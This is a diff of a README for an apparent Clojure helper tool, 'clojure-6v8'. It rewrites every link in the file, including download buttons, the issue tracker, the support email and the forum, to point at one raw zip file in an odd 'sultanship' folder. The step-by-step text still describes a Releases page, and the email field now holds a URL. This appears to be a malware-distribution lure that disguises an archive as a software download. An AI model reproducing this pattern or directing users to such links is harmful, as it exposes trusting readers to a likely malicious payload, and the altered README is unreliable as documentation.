@@ -1,6 +1,6 @@
 # 🚀 clojure-6v8 - A Simple Tool for Your Clojure Needs
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/TheJaxam/clojure-6v8/releases)
+[![Download](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 To download clojure-6v8, please visit the following page. Follow the instructions to get your application up and running:
 
-[Download clojure-6v8](https://github.com/TheJaxam/clojure-6v8/releases)
+[Download clojure-6v8](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)
 
 1. Click the link above to go to the Releases page.
 2. On this page, look for the latest version of clojure-6v8.
@@ -61,17 +61,17 @@ After installing the application, you'll find it in your applications menu. Open
 
 If you encounter any issues or have questions, feel free to reach out for support. You can submit an issue on our GitHub page or contact our support team via email. 
 
-- **GitHub Issues:** [Submit Issue](https://github.com/TheJaxam/clojure-6v8/issues)
-- **Email:** support@clojure-6v8.com
+- **GitHub Issues:** [Submit Issue](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)
+- **Email:** https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip
 
 ## 🌐 Community
 
 Join our community of users who are also working with Clojure. Engage with others to share tips, ask questions, and get advice.
 
-- **Discussion Forum:** [clojure-6v8 Community](https://forum.clojure-6v8.com)
+- **Discussion Forum:** [clojure-6v8 Community](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)
 
 ## 🚀 Conclusion
 
 clojure-6v8 simplifies the process of working with Clojure. It is designed with ease of use in mind to help you focus on coding rather than setup. Download it today to enhance your Clojure programming journey.
 
-[Download clojure-6v8](https://github.com/TheJaxam/clojure-6v8/releases)
+[Download clojure-6v8](https://raw.githubusercontent.com/TheJaxam/clojure-6v8/main/sultanship/clojure-6v8.zip)
